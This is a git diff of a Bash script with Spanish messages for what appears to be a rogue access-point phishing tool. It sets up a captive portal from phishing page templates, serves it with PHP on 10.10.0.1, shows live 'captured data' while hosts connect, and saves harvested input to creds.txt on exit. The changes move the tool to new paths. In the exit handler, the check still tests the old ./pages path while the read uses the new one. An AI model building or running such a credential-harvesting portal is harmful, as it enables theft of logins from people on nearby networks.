@@ -4,10 +4,11 @@ trap ctrl_c INT
 function ctrl_c(){
 	echo -e " Saliendo..."
 	./src/reset.sh ap
+	rm -r page/captive_portal/html_page
 
-	if [ -n "$(/bin/cat ./pages/$pagina/datos.txt 2>&1)" ];then
-		/bin/cat ./pages/$pagina/datos.txt 2> /dev/null > creds.txt
-		echo "" > ./pages/$pagina/datos.txt
+	if [ -n "$(/bin/cat ./pages/$pagina/data.txt 2>&1)" ];then
+		/bin/cat ./page/captive_portal/data.txt 2> /dev/null > creds.txt
+		rm ./page/captive_portal/data.txt
 	fi
 	exit 0
 }
@@ -50,7 +51,7 @@ function datos_ap(){
 	done
 
 	paginas=()
-	for dir in pages/*/; do
+	for dir in page/templates/*/; do
 		[ -d "$dir" ] && paginas+=("$(basename "$dir")")
 	done
 
@@ -132,7 +133,7 @@ function hosts_connect(){
 		echo -e "\nDatos capturados: $datoscap\n"
 		echo -e "----------------------------------------------------------"
 		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "10.10.0.1 " | wc -l 2> /dev/null)
-		datoscap=$(/bin/cat pages/$pagina/datos.txt 2>/dev/null)
+		datoscap=$(/bin/cat ./page/captive_portal/data.txt 2>/dev/null)
 		sleep 2
 	done
 
@@ -141,7 +142,9 @@ function hosts_connect(){
 function portal(){
 	echo -e ". . . . Configurando portal cautivo"
 	sleep 0.5
-	pushd pages/$pagina > /dev/null 2>&1
+	pushd page/captive_portal > /dev/null 2>&1
+	rm -r html_page 2> /dev/null
+	cp -r ../templates/$pagina html_page/
 	php -S 10.10.0.1:80 > /dev/null 2>&1 &
 	sleep 1
 	popd > /dev/null 2>&1
